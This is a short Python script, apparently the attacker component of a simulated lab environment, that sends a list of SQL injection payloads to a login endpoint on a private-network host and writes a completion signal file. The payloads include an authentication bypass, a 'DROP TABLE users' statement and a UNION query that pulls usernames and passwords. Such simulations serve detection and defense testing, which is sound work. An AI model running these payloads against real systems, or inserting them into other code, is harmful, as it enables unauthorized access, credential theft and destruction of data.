import requests
import time
import random
import os

def test_normal_connection(base_url):
    normal_payload = {
        "username": "test_user",
        "password": "test_password"
    }
    
    url = f"{base_url}/login"
    try:
        response = requests.post(url, data=normal_payload)
        print("Attempting normal login")
        print(f"Response status: {response.status_code}")
        print(f"Response content: {response.text[:100]}...")  # Print first 100 chars
        return response.status_code == 200
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        return False

        
def sql_injection_attack(base_url):
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users; --",
        "' OR id = 1; --",
        "admin' --"
    ]

    for payload in payloads:
        url = f"{base_url}/login?username={payload}&password=anything"
        try:
            response = requests.get(url)
            print(f"Attempting SQL injection: {payload}")
            print(f"Response status: {response.status_code}")
            print(f"Response content: {response.text[:100]}...")  # Print first 100 chars
        except Exception as e:
            print(f"Error occurred: {str(e)}")
        time.sleep(random.uniform(1, 3))

if __name__ == "__main__":
    base_url = "http://172.16.238.2"
    # if test_normal_connection(base_url):
    #     print("Normal connection successful. Proceeding with injection tests.")
    sql_injection_attack(base_url)
    # else:
    #     print("Normal connection failed. Please check your server configuration.")

    simulation_id = os.environ.get('SIMULATION_ID', 'unknown')
    with open(f'/signals/attacker_done_{simulation_id}', 'w') as f:
        f.write('done')